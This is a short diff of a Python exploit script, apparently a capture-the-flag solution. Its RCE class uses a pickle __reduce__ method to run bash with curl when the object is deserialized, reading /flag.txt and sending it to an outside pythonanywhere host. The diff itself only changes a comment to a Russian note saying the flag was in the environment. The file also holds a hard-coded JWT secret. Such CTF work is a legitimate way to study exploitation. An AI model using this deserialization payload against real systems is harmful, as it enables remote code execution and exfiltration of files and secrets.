@@ -14,7 +14,7 @@ def encode_jwt(jwt_data, jwt_key='SecreT'):
 
 class RCE:
     def __reduce__(self):
-        # code = open('rce.py', 'r').read()
+        # флаг находился в env
         cmd = ['bash', '-c', 'curl "https://ctfforsite.pythonanywhere.com/`cat /flag.txt`"']
         return __import__('subprocess').check_output, (cmd,)
 
